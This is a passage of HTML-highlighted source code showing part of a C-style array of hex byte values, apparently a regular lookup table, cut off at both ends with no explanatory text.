<span class="number">0xaf</span>, <span class="number">0xda</span>, <span class="number">0x18</span>, <span class="number">0xb8</span>, <span class="number">0x00</span>, <span class="number">0x47</span>, <span class="number">0xcc</span>, <span class="number">0x3e</span>, <span class="number">0x8c</span>, <span class="number">0x67</span>, <span class="number">0x81</span>, <span class="number">0x56</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x0c</span>, <span class="number">0x26</span>, <span class="number">0xf4</span>, <span class="number">0x73</span>, <span class="number">0x2f</span>, <span class="number">0x35</span>, <span class="number">0xaf</span>, <span class="number">0x55</span>, <span class="number">0x30</span>, <span class="number">0x5f</span>, <span class="number">0xa0</span>, <span class="number">0xd5</span>, <span class="number">0x17</span>, <span class="number">0xb7</span>, <span class="number">0x0f</span>, <span class="number">0x48</span>, <span class="number">0xc3</span>, <span class="number">0x31</span>, <span class="number">0x83</span>, <span class="number">0x68</span>, <span class="number">0x8e</span>, <span class="number">0x59</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x0d</span>, <span class="number">0x27</span>, <span class="number">0xf5</span>, <span class="number">0x72</span>, <span class="number">0x2e</span>, <span class="number">0x34</span>, <span class="number">0xae</span>, <span class="number">0x54</span>, <span class="number">0x31</span>, <span class="number">0x5e</span>, <span class="number">0xa1</span>, <span class="number">0xd4</span>, <span class="number">0x16</span>, <span class="number">0xb6</span>, <span class="number">0x0e</span>, <span class="number">0x49</span>, <span class="number">0xc2</span>, <span class="number">0x30</span>, <span class="number">0x82</span>, <span class="number">0x69</span>, <span class="number">0x8f</span>, <span class="number">0x58</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x0e</span>, <span class="number">0x24</span>, <span class="number">0xf6</span>, <span class="number">0x71</span>, <span class="number">0x2d</span>, <span class="number">0x37</span>, <span class="number">0xad</span>, <span class="number">0x57</span>, <span class="number">0x32</span>, <span class="number">0x5d</span>, <span class="number">0xa2</span>, <span class="number">0xd7</span>, <span class="number">0x15</span>, <span class="number">0xb5</span>, <span class="number">0x0d</span>, <span class="number">0x4a</span>, <span class="number">0xc1</span>, <span class="number">0x33</span>, <span class="number">0x81</span>, <span class="number">0x6a</span>, <span class="number">0x8c</span>, <span class="number">0x5b</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x0f</span>, <span class="number">0x25</span>, <span class="number">0xf7</span>, <span class="number">0x70</span>, <span class="number">0x2c</span>, <span class="number">0x36</span>, <span class="number">0xac</span>, <span class="number">0x56</span>, <span class="number">0x33</span>, <span class="number">0x5c</span>, <span class="number">0xa3</span>, <span class="number">0xd6</span>, <span class="number">0x14</span>, <span class="number">0xb4</span>, <span class="number">0x0c</span>, <span class="number">0x4b</span>, <span class="number">0xc0</span>, <span class="number">0x32</span>, <span class="number">0x80</span>, <span class="number">0x6b</span>, <span class="number">0x8d</span>, <span class="number">0x5a</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x08</span>, <span class="number">0x22</span>, <span class="number">0xf0</span>, <span class="number">0x77</span>, <span class="number">0x2b</span>, <span class="number">0x31</span>, <span class="number">0xab</span>, <span class="number">0x51</span>, <span class="number">0x34</span>, <span class="number">0x5b</span>, <span class="number">0xa4</span>, <span class="number">0xd1</span>, <span class="number">0x13</span>, <span class="number">0xb3</span>, <span class="number">0x0b</span>, <span class="number">0x4c</span>, <span class="number">0xc7</span>, <span class="number">0x35</span>, <span class="number">0x87</span>, <span class="number">0x6c</span>, <span class="number">0x8a</span>, <span class="number">0x5d</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x09</span>, <span class="number">0x23</span>, <span class="number">0xf1</span>, <span class="number">0x76</span>, <span class="number">0x2a</span>, <span class="number">0x30</span>, <span class="number">0xaa</span>, <span class="number">0x50</span>, <span class="number">0x35</span>, <span class="number">0x5a</span>, <span class="number">0xa5</span>, <span class="number">0xd0</span>, <span class="number">0x12</span>, <span class="number">0xb2</span>, <span class="number">0x0a</span>, <span class="number">0x4d</span>, <span class="number">0xc6</span>, <span class="number">0x34</span>, <span class="number">0x86</span>, <span class="number">0x6d</span>, <span class="number">0x8b</span>, <span class="number">0x5c</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x0a</span>, <span class="number">0x20</span>, <span class="number">0xf2</span>, <span class="number">0x75</span>, <span class="number">0x29</span>, <span class="number">0x33</span>, <span class="number">0xa9</span>, <span class="number">0x53</span>, <span class="number">0x36</span>, <span class="number">0x59</span>, <span class="number">0xa6</span>, <span class="number">0xd3</span>, <span class="number">0x11</span>, <span class="number">0xb1</span>, <span class="number">0x09</span>, <span class="number">0x4e</span>, <span class="number">0xc5</span>, <span class="number">0x37</span>, <span class="number">0x85</span>, <span class="number">0x6e</span>, <span class="number">0x88</span>, <span class="number">0x5f</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x0b</span>, <span class="number">0x21</span>, <span class="number">0xf3</span>, <span class="number">0x74</span>, <span class="number">0x28</span>, <span class="number">0x32</span>, <span class="number">0xa8</span>, <span class="number">0x52</span>, <span class="number">0x37</span>, <span class="number">0x58</span>, <span class="number">0xa7</span>, <span class="number">0xd2</span>, <span class="number">0x10</span>, <span class="number">0xb0</span>, <span class="number">0x08</span>, <span class="number">0x4f</span>, <span class="number">0xc4</span>, <span class="number">0x36</span>, <span class="number">0x84</span>, <span class="number">0x6f</span>, <span class="number">0x89</span>, <span class="number">0x5e</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x14</span>, <span class="number">0x3e</span>, <span class="number">0xec</span>, <span class="number">0x6b</span>, <span class="number">0x37</span>, <span class="number">0x2d</span>, <span class="number">0xb7</span>, <span class="number">0x4d</span>, <span class="number">0x28</span>, <span class="number">0x47</span>, <span class="number">0xb8</span>, <span class="number">0xcd</span>, <span class="number">0x0f</span>, <span class="number">0xaf</span>, <span class="number">0x17</span>, <span class="number">0x50</span>, <span class="number">0xdb</span>, <span class="number">0x29</span>, <span class="number">0x9b</span>, <span class="number">0x70</span>, <span class="number">0x96</span>, <span class="number">0x41</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x15</span>, <span class="number">0x3f</span>, <span class="number">0xed</span>, <span class="number">0x6a</span>, <span class="number">0x36</span>, <span class="number">0x2c</span>, <span class="number">0xb6</span>, <span class="number">0x4c</span>, <span class="number">0x29</span>, <span class="number">0x46</span>, <span class="number">0xb9</span>, <span class="number">0xcc</span>, <span class="number">0x0e</span>, <span class="number">0xae</span>, <span class="number">0x16</span>, <span class="number">0x51</span>, <span class="number">0xda</span>, <span class="number">0x28</span>, <span class="number">0x9a</span>, <span class="number">0x71</span>, <span class="number">0x97</span>, <span class="number">0x40</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x16</span>, <span class="number">0x3c</span>, <span class="number">0xee</span>, <span class="number">0x69</span>, <span class="number">0x35</span>, <span class="number">0x2f</span>, <span class="number">0xb5</span>, <span class="number">0x4f</span>, <span class="number">0x2a</span>, <span class="number">0x45</span>, <span class="number">0xba</span>, <span class="number">0xcf</span>, <span class="number">0x0d</span>, <span class="number">0xad</span>, <span class="number">0x15</span>, <span class="number">0x52</span>, <span class="number">0xd9</span>, <span class="number">0x2b</span>, <span class="number">0x99</span>, <span class="number">0x72</span>, <span class="number">0x94</span>, <span class="number">0x43</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x17</span>, <span class="number">0x3d</span>, <span class="number">0xef</span>, <span class="number">0x68</span>, <span class="number">0x34</span>, <span class="number">0x2e</span>, <span class="number">0xb4</span>, <span class="number">0x4e</span>, <span class="number">0x2b</span>, <span class="number">0x44</span>, <span class="number">0xbb</span>, <span class="number">0xce</span>, <span class="number">0x0c</span>, <span class="number">0xac</span>, <span class="number">0x14</span>, <span class="number">0x53</span>, <span class="number">0xd8</span>, <span class="number">0x2a</span>, <span class="number">0x98</span>, <span class="number">0x73</span>, <span class="number">0x95</span>, <span class="number">0x42</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x10</span>, <span class="number">0x3a</span>, <span class="number">0xe8</span>, <span class="number">0x6f</span>, <span class="number">0x33</span>, <span class="number">0x29</span>, <span class="number">0xb3</span>, <span class="number">0x49</span>, <span class="number">0x2c</span>, <span class="number">0x43</span>, <span class="number">0xbc</span>, <span class="number">0xc9</span>, <span class="number">0x0b</span>, <span class="number">0xab</span>, <span class="number">0x13</span>, <span class="number">0x54</span>, <span class="number">0xdf</span>, <span class="number">0x2d</span>, <span class="number">0x9f</span>, <span class="number">0x74</span>, <span class="number">0x92</span>, <span class="number">0x45</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x11</span>, <span class="number">0x3b</span>, <span class="number">0xe9</span>, <span class="number">0x6e</span>, <span class="number">0x32</span>, <span class="number">0x28</span>, <span class="number">0xb2</span>, <span class="number">0x48</span>, <span class="number">0x2d</span>, <span class="number">0x42</span>, <span class="number">0xbd</span>, <span class="number">0xc8</span>, <span class="number">0x0a</span>, <span class="number">0xaa</span>, <span class="number">0x12</span>, <span class="number">0x55</span>, <span class="number">0xde</span>, <span class="number">0x2c</span>, <span class="number">0x9e</span>, <span class="number">0x75</span>, <span class="number">0x93</span>, <span class="number">0x44</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x12</span>, <span class="number">0x38</span>, <span class="number">0xea</span>, <span class="number">0x6d</span>, <span class="number">0x31</span>, <span class="number">0x2b</span>, <span class="number">0xb1</span>, <span class="number">0x4b</span>, <span class="number">0x2e</span>, <span class="number">0x41</span>, <span class="number">0xbe</span>, <span class="number">0xcb</span>, <span class="number">0x09</span>, <span class="number">0xa9</span>, <span class="number">0x11</span>, <span class="number">0x56</span>, <span class="number">0xdd</span>, <span class="number">0x2f</span>, <span class="number">0x9d</span>, <span class="number">0x76</span>, <span class="number">0x90</span>, <span class="number">0x47</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x13</span>, <span class="number">0x39</span>, <span class="number">0xeb</span>, <span class="number">0x6c</span>, <span class="number">0x30</span>, <span class="number">0x2a</span>, <span class="number">0xb0</span>, <span class="number">0x4a</span>, <span class="number">0x2f</span>, <span class="number">0x40</span>, <span class="number">0xbf</span>, <span class="number">0xca</span>, <span class="number">0x08</span>, <span class="number">0xa8</span>, <span class="number">0x10</span>, <span class="number">0x57</span>, <span class="number">0xdc</span>, <span class="number">0x2e</span>, <span class="number">0x9c</span>, <span class="number">0x77</span>, <span class="number">0x91</span>, <span class="number">0x46</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x1c</span>, <span class="number">0x36</span>, <span class="number">0xe4</span>, <span class="number">0x63</span>, <span class="number">0x3f</span>, <span class="number">0x25</span>, <span class="number">0xbf</span>, <span class="number">0x45</span>, <span class="number">0x20</span>, <span class="number">0x4f</span>, <span class="number">0xb0</span>, <span class="number">0xc5</span>, <span class="number">0x07</span>, <span class="number">0xa7</span>, <span class="number">0x1f</span>, <span class="number">0x58</span>, <span class="number">0xd3</span>, <span class="number">0x21</span>, <span class="number">0x93</span>, <span class="number">0x78</span>, <span class="number">0x9e</span>, <span class="number">0x49</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x1d</span>, <span class="number">0x37</span>, <span class="number">0xe5</span>, <span class="number">0x62</span>, <span class="number">0x3e</span>, <span class="number">0x24</span>, <span class="number">0xbe</span>, <span class="number">0x44</span>, <span class="number">0x21</span>, <span class="number">0x4e</span>, <span class="number">0xb1</span>, <span class="number">0xc4</span>, <span class="number">0x06</span>, <span class="number">0xa6</span>, <span class="number">0x1e</span>, <span class="number">0x59</span>, <span class="number">0xd2</span>, <span class="number">0x20</span>, <span class="number">0x92</span>, <span class="number">0x79</span>, <span class="number">0x9f</span>, <span class="number">0x48</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x1e</span>, <span class="number">0x34</span>, <span class="number">0xe6</span>, <span class="number">0x61</span>, <span class="number">0x3d</span>, <span class="number">0x27</span>, <span class="number">0xbd</span>, <span class="number">0x47</span>, <span class="number">0x22</span>, <span class="number">0x4d</span>, <span class="number">0xb2</span>, <span class="number">0xc7</span>, <span class="number">0x05</span>, <span class="number">0xa5</span>, <span class="number">0x1d</span>, <span class="number">0x5a</span>, <span class="number">0xd1</span>, <span class="number">0x23</span>, <span class="number">0x91</span>, <span class="number">0x7a</span>, <span class="number">0x9c</span>, <span class="number">0x4b</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x1f</span>, <span class="number">0x35</span>, <span class="number">0xe7</span>, <span class="number">0x60</span>, <span class="number">0x3c</span>, <span class="number">0x26</span>, <span class="number">0xbc</span>, <span class="number">0x46</span>, <span class="number">0x23</span>, <span class="number">0x4c</span>, <span class="number">0xb3</span>, <span class="number">0xc6</span>, <span class="number">0x04</span>, <span class="number">0xa4</span>, <span class="number">0x1c</span>, <span class="number">0x5b</span>, <span class="number">0xd0</span>, <span class="number">0x22</span>, <span class="number">0x90</span>, <span class="number">0x7b</span>, <span class="number">0x9d</span>, <span class="number">0x4a</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x18</span>, <span class="number">0x32</span>, <span class="number">0xe0</span>, <span class="number">0x67</span>, <span class="number">0x3b</span>, <span class="number">0x21</span>, <span class="number">0xbb</span>, <span class="number">0x41</span>, <span class="number">0x24</span>, <span class="number">0x4b</span>, <span class="number">0xb4</span>, <span class="number">0xc1</span>, <span class="number">0x03</span>, <span class="number">0xa3</span>, <span class="number">0x1b</span>, <span class="number">0x5c</span>, <span class="number">0xd7</span>, <span class="number">0x25</span>, <span class="number">0x97</span>, <span class="number">0x7c</span>, <span class="number">0x9a</span>, <span class="number">0x4d</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x19</span>, <span class="number">0x33</span>, <span class="number">0xe1</span>, <span class="number">0x66</span>, <span class="number">0x3a</span>, <span class="number">0x20</span>, <span class="number">0xba</span>, <span class="number">0x40</span>, <span class="number">0x25</span>, <span class="number">0x4a</span>, <span class="number">0xb5</span>, <span class="number">0xc0</span>, <span class="number">0x02</span>, <span class="number">0xa2</span>, <span class="number">0x1a</span>, <span class="number">0x5d</span>, <span class="number">0xd6</span>, <span class="number">0x24</span>, <span class="number">0x96</span>, <span class="number">0x7d</span>, <span class="number">0x9b</span>, <span class="number">0x4c</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x1a</span>, <span class="number">0x30</span>, <span class="number">0xe2</span>, <span class="number">0x65</span>, <span class="number">0x39</span>, <span class="number">0x23</span>, <span class="number">0xb9</span>, <span class="number">0x43</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0xb6</span>, <span class="number">0xc3</span>, <span class="number">0x01</span>, <span class="number">0xa1</span>, <span class="number">0x19</span>, <span class="number">0x5e</span>, <span class="number">0xd5</span>, <span class="number">0x27</span>, <span class="number">0x95</span>, <span class="number">0x7e</span>, <span class="number">0x98</span>, <span class="number">0x4f</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x1b</span>, <span class="number">0x31</span>, <span class="number">0xe3</span>, <span class="number">0x64</span>, <span class="number">0x38</span>, <span class="number">0x22</span>, <span class="number">0xb8</span>, <span class="number">0x42</span>, <span class="number">0x27</span>, <span class="number">0x48</span>, <span class="number">0xb7</span>, <span class="number">0xc2</span>, <span class="number">0x00</span>, <span class="number">0xa0</span>, <span class="number">0x18</span>, <span class="number">0x5f</span>, <span class="number">0xd4</span>, <span class="number">0x26</span>, <span class="number">0x94</span>, <span class="number">0x7f</span>, <span class="number">0x99</span>, <span class="number">0x4e</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x24</span>, <span class="number">0x0e</span>, <span class="number">0xdc</span>, <span class="number">0x5b</span>, <span class="number">0x07</span>, <span class="number">0x1d</span>, <span class="number">0x87</span>, <span class="number">0x7d</span>, <span class="number">0x18</span>, <span class="number">0x77</span>, <span class="number">0x88</span>, <span class="number">0xfd</span>, <span class="number">0x3f</span>, <span class="number">0x9f</span>, <span class="number">0x27</span>, <span class="number">0x60</span>, <span class="number">0xeb</span>, <span class="number">0x19</span>, <span class="number">0xab</span>, <span class="number">0x40</span>, <span class="number">0xa6</span>, <span class="number">0x71</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x25</span>, <span class="number">0x0f</span>, <span class="number">0xdd</span>, <span class="number">0x5a</span>, <span class="number">0x06</span>, <span class="number">0x1c</span>, <span class="number">0x86</span>, <span class="number">0x7c</span>, <span class="number">0x19</span>, <span class="number">0x76</span>, <span class="number">0x89</span>, <span class="number">0xfc</span>, <span class="number">0x3e</span>, <span class="number">0x9e</span>, <span class="number">0x26</span>, <span class="number">0x61</span>, <span class="number">0xea</span>, <span class="number">0x18</span>, <span class="number">0xaa</span>, <span class="number">0x41</span>, <span class="number">0xa7</span>, <span class="number">0x70</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x26</span>, <span class="number">0x0c</span>, <span class="number">0xde</span>, <span class="number">0x59</span>, <span class="number">0x05</span>, <span class="number">0x1f</span>, <span class="number">0x85</span>, <span class="number">0x7f</span>, <span class="number">0x1a</span>, <span class="number">0x75</span>, <span class="number">0x8a</span>, <span class="number">0xff</span>, <span class="number">0x3d</span>, <span class="number">0x9d</span>, <span class="number">0x25</span>, <span class="number">0x62</span>, <span class="number">0xe9</span>, <span class="number">0x1b</span>, <span class="number">0xa9</span>, <span class="number">0x42</span>, <span class="number">0xa4</span>, <span class="number">0x73</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x27</span>, <span class="number">0x0d</span>, <span class="number">0xdf</span>, <span class="number">0x58</span>, <span class="number">0x04</span>, <span class="number">0x1e</span>, <span class="number">0x84</span>, <span class="number">0x7e</span>, <span class="number">0x1b</span>, <span class="number">0x74</span>, <span class="number">0x8b</span>, <span class="number">0xfe</span>, <span class="number">0x3c</span>, <span class="number">0x9c</span>, <span class="number">0x24</span>, <span class="number">0x63</span>, <span class="number">0xe8</span>, <span class="number">0x1a</span>, <span class="number">0xa8</span>, <span class="number">0x43</span>, <span class="number">0xa5</span>, <span class="number">0x72</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x20</span>, <span class="number">0x0a</span>, <span class="number">0xd8</span>, <span class="number">0x5f</span>, <span class="number">0x03</span>, <span class="number">0x19</span>, <span class="number">0x83</span>, <span class="number">0x79</span>, <span class="number">0x1c</span>, <span class="number">0x73</span>, <span class="number">0x8c</span>, <span class="number">0xf9</span>, <span class="number">0x3b</span>, <span class="number">0x9b</span>, <span class="number">0x23</span>, <span class="number">0x64</span>, <span class="number">0xef</span>, <span class="number">0x1d</span>, <span class="number">0xaf</span>, <span class="number">0x44</span>, <span class="number">0xa2</span>, <span class="number">0x75</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x21</span>, <span class="number">0x0b</span>, <span class="number">0xd9</span>, <span class="number">0x5e</span>, <span class="number">0x02</span>, <span class="number">0x18</span>, <span class="number">0x82</span>, <span class="number">0x78</span>, <span class="number">0x1d</span>, <span class="number">0x72</span>, <span class="number">0x8d</span>, <span class="number">0xf8</span>, <span class="number">0x3a</span>, <span class="number">0x9a</span>, <span class="number">0x22</span>, <span class="number">0x65</span>, <span class="number">0xee</span>, <span class="number">0x1c</span>, <span class="number">0xae</span>, <span class="number">0x45</span>, <span class="number">0xa3</span>, <span class="number">0x74</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x22</span>, <span class="number">0x08</span>, <span class="number">0xda</span>, <span class="number">0x5d</span>, <span class="number">0x01</span>, <span class="number">0x1b</span>, <span class="number">0x81</span>, <span class="number">0x7b</span>, <span class="number">0x1e</span>, <span class="number">0x71</span>, <span class="number">0x8e</span>, <span class="number">0xfb</span>, <span class="number">0x39</span>, <span class="number">0x99</span>, <span class="number">0x21</span>, <span class="number">0x66</span>, <span class="number">0xed</span>, <span class="number">0x1f</span>, <span class="number">0xad</span>, <span class="number">0x46</span>, <span class="number">0xa0</span>, <span class="number">0x77</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x23</span>, <span class="number">0x09</span>, <span class="number">0xdb</span>, <span class="number">0x5c</span>, <span class="number">0x00</span>, <span class="number">0x1a</span>, <span class="number">0x80</span>, <span class="number">0x7a</span>, <span class="number">0x1f</span>, <span class="number">0x70</span>, <span class="number">0x8f</span>, <span class="number">0xfa</span>, <span class="number">0x38</span>, <span class="number">0x98</span>, <span class="number">0x20</span>, <span class="number">0x67</span>, <span class="number">0xec</span>, <span class="number">0x1e</span>, <span class="number">0xac</span>, <span class="number">0x47</span>, <span class="number">0xa1</span>, <span class="number">0x76</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x2c</span>, <span class="number">0x06</span>, <span class="number">0xd4</span>, <span class="number">0x53</span>, <span class="number">0x0f</span>, <span class="number">0x15</span>, <span class="number">0x8f</span>, <span class="number">0x75</span>, <span class="number">0x10</span>, <span class="number">0x7f</span>, <span class="number">0x80</span>, <span class="number">0xf5</span>, <span class="number">0x37</span>, <span class="number">0x97</span>, <span class="number">0x2f</span>, <span class="number">0x68</span>, <span class="number">0xe3</span>, <span class="number">0x11</span>, <span class="number">0xa3</span>, <span class="number">0x48</span>, <span class="number">0xae</span>, <span class="number">0x79</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x2d</span>, <span class="number">0x07</span>, <span class="number">0xd5</span>, <span class="number">0x52</span>, <span class="number">0x0e</span>, <span class="number">0x14</span>, <span class="number">0x8e</span>, <span class="number">0x74</span>, <span class="number">0x11</span>, <span class="number">0x7e</span>, <span class="number">0x81</span>, <span class="number">0xf4</span>, <span class="number">0x36</span>, <span class="number">0x96</span>, <span class="number">0x2e</span>, <span class="number">0x69</span>, <span class="number">0xe2</span>, <span class="number">0x10</span>, <span class="number">0xa2</span>, <span class="number">0x49</span>, <span class="number">0xaf</span>, <span class="number">0x78</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x2e</span>, <span class="number">0x04</span>, <span class="number">0xd6</span>, <span class="number">0x51</span>, <span class="number">0x0d</span>, <span class="number">0x17</span>, <span class="number">0x8d</span>, <span class="number">0x77</span>, <span class="number">0x12</span>, <span class="number">0x7d</span>, <span class="number">0x82</span>, <span class="number">0xf7</span>, <span class="number">0x35</span>, <span class="number">0x95</span>, <span class="number">0x2d</span>, <span class="number">0x6a</span>, <span class="number">0xe1</span>, <span class="number">0x13</span>, <span class="number">0xa1</span>, <span class="number">0x4a</span>, <span class="number">0xac</span>, <span class="number">0x7b</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x2f</span>, <span class="number">0x05</span>, <span class="number">0xd7</span>, <span class="number">0x50</span>, <span class="number">0x0c</span>, <span class="number">0x16</span>, <span class="number">0x8c</span>, <span class="number">0x76</span>, <span class="number">0x13</span>, <span class="number">0x7c</span>, <span class="number">0x83</span>, <span class="number">0xf6</span>, <span class="number">0x34</span>, <span class="number">0x94</span>, <span class="number">0x2c</span>, <span class="number">0x6b</span>, <span class="number">0xe0</span>, <span class="number">0x12</span>, <span class="number">0xa0</span>, <span class="number">0x4b</span>, <span class="number">0xad</span>, <span class="number">0x7a</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x28</span>, <span class="number">0x02</span>, <span class="number">0xd0</span>, <span class="number">0x57</span>, <span class="number">0x0b</span>, <span class="number">0x11</span>, <span class="number">0x8b</span>, <span class="number">0x71</span>, <span class="number">0x14</span>, <span class="number">0x7b</span>, <span class="number">0x84</span>, <span class="number">0xf1</span>, <span class="number">0x33</span>, <span class="number">0x93</span>, <span class="number">0x2b</span>, <span class="number">0x6c</span>, <span class="number">0xe7</span>, <span class="number">0x15</span>, <span class="number">0xa7</span>, <span class="number">0x4c</span>, <span class="number">0xaa</span>, <span class="number">0x7d</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x29</span>, <span class="number">0x03</span>, <span class="number">0xd1</span>, <span class="number">0x56</span>, <span class="number">0x0a</span>, <span class="number">0x10</span>, <span class="number">0x8a</span>, <span class="number">0x70</span>, <span class="number">0x15</span>, <span class="number">0x7a</span>, <span class="number">0x85</span>, <span class="number">0xf0</span>, <span class="number">0x32</span>, <span class="number">0x92</span>, <span class="number">0x2a</span>, <span class="number">0x6d</span>, <span class="number">0xe6</span>, <span class="number">0x14</span>, <span class="number">0xa6</span>, <span class="number">0x4d</span>, <span class="number">0xab</span>, <span class="number">0x7c</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x2a</span>, <span class="number">0x00</span>, <span class="number">0xd2</span>, <span class="number">0x55</span>, <span class="number">0x09</span>, <span class="number">0x13</span>, <span class="number">0x89</span>, <span class="number">0x73</span>, <span class="number">0x16</span>, <span class="number">0x79</span>, <span class="number">0x86</span>, <span class="number">0xf3</span>, <span class="number">0x31</span>, <span class="number">0x91</span>, <span class="number">0x29</span>, <span class="number">0x6e</span>, <span class="number">0xe5</span>, <span class="number">0x17</span>, <span class="number">0xa5</span>, <span class="number">0x4e</span>, <span class="number">0xa8</span>, <span class="number">0x7f</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x2b</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x54</span>, <span class="number">0x08</span>, <span class="number">0x12</span>, <span class="number">0x88</span>, <span class="number">0x72</span>, <span class="number">0x17</span>, <span class="number">0x78</span>, <span class="number">0x87</span>, <span class="number">0xf2</span>, <span class="number">0x30</span>, <span class="number">0x90</span>, <span class="number">0x28</span>, <span class="number">0x6f</span>, <span class="number">0xe4</span>, <span class="number">0x16</span>, <span class="number">0xa4</span>, <span class="number">0x4f</span>, <span class="number">0xa9</span>, <span class="number">0x7e</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x34</span>, <span class="number">0x1e</span>, <span class="number">0xcc</span>, <span class="number">0x4b</span>, <span class="number">0x17</span>, <span class="number">0x0d</span>, <span class="number">0x97</span>, <span class="number">0x6d</span>, <span class="number">0x08</span>, <span class="number">0x67</span>, <span class="number">0x98</span>, <span class="number">0xed</span>, <span class="number">0x2f</span>, <span class="number">0x8f</span>, <span class="number">0x37</span>, <span class="number">0x70</span>, <span class="number">0xfb</span>, <span class="number">0x09</span>, <span class="number">0xbb</span>, <span class="number">0x50</span>, <span class="number">0xb6</span>, <span class="number">0x61</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x35</span>, <span class="number">0x1f</span>, <span class="number">0xcd</span>, <span class="number">0x4a</span>, <span class="number">0x16</span>, <span class="number">0x0c</span>, <span class="number">0x96</span>, <span class="number">0x6c</span>, <span class="number">0x09</span>, <span class="number">0x66</span>, <span class="number">0x99</span>, <span class="number">0xec</span>, <span class="number">0x2e</span>, <span class="number">0x8e</span>, <span class="number">0x36</span>, <span class="number">0x71</span>, <span class="number">0xfa</span>, <span class="number">0x08</span>, <span class="number">0xba</span>, <span class="number">0x51</span>, <span class="number">0xb7</span>, <span class="number">0x60</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x36</span>, <span class="number">0x1c</span>, <span class="number">0xce</span>, <span class="number">0x49</span>, <span class="number">0x15</span>, <span class="number">0x0f</span>, <span class="number">0x95</span>, <span class="number">0x6f</span>, <span class="number">0x0a</span>, <span class="number">0x65</span>, <span class="number">0x9a</span>, <span class="number">0xef</span>, <span class="number">0x2d</span>, <span class="number">0x8d</span>, <span class="number">0x35</span>, <span class="number">0x72</span>, <span class="number">0xf9</span>, <span class="number">0x0b</span>, <span class="number">0xb9</span>, <span class="number">0x52</span>, <span class="number">0xb4</span>, <span class="number">0x63</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x37</span>, <span class="number">0x1d</span>, <span class="number">0xcf</span>, <span class="number">0x48</span>, <span class="number">0x14</span>, <span class="number">0x0e</span>, <span class="number">0x94</span>, <span class="number">0x6e</span>, <span class="number">0x0b</span>, <span class="number">0x64</span>, <span class="number">0x9b</span>, <span class="number">0xee</span>, <span class="number">0x2c</span>, <span class="number">0x8c</span>, <span class="number">0x34</span>, <span class="number">0x73</span>, <span class="number">0xf8</span>, <span class="number">0x0a</span>, <span class="number">0xb8</span>, <span class="number">0x53</span>, <span class="number">0xb5</span>, <span class="number">0x62</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x30</span>, <span class="number">0x1a</span>, <span class="number">0xc8</span>, <span class="number">0x4f</span>, <span class="number">0x13</span>, <span class="number">0x09</span>, <span class="number">0x93</span>, <span class="number">0x69</span>, <span class="number">0x0c</span>, <span class="number">0x63</span>, <span class="number">0x9c</span>, <span class="number">0xe9</span>, <span class="number">0x2b</span>, <span class="number">0x8b</span>, <span class="number">0x33</span>, <span class="number">0x74</span>, <span class="number">0xff</span>, <span class="number">0x0d</span>, <span class="number">0xbf</span>, <span class="number">0x54</span>, <span class="number">0xb2</span>, <span class="number">0x65</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x31</span>, <span class="number">0x1b</span>, <span class="number">0xc9</span>, <span class="number">0x4e</span>, <span class="number">0x12</span>, <span class="number">0x08</span>, <span class="number">0x92</span>, <span class="number">0x68</span>, <span class="number">0x0d</span>, <span class="number">0x62</span>, <span class="number">0x9d</span>, <span class="number">0xe8</span>, <span class="number">0x2a</span>, <span class="number">0x8a</span>, <span class="number">0x32</span>, <span class="number">0x75</span>, <span class="number">0xfe</span>, <span class="number">0x0c</span>, <span class="number">0xbe</span>, <span class="number">0x55</span>, <span class="number">0xb3</span>, <span class="number">0x64</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x32</span>, <span class="number">0x18</span>, <span class="number">0xca</span>, <span class="number">0x4d</span>, <span class="number">0x11</span>, <span class="number">0x0b</span>, <span class="number">0x91</span>, <span class="number">0x6b</span>, <span class="number">0x0e</span>, <span class="number">0x61</span>, <span class="number">0x9e</span>, <span class="number">0xeb</span>, <span class="number">0x29</span>, <span class="number">0x89</span>, <span class="number">0x31</span>, <span class="number">0x76</span>, <span class="number">0xfd</span>, <span class="number">0x0f</span>, <span class="number">0xbd</span>, <span class="number">0x56</span>, <span class="number">0xb0</span>, <span class="number">0x67</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x33</span>, <span 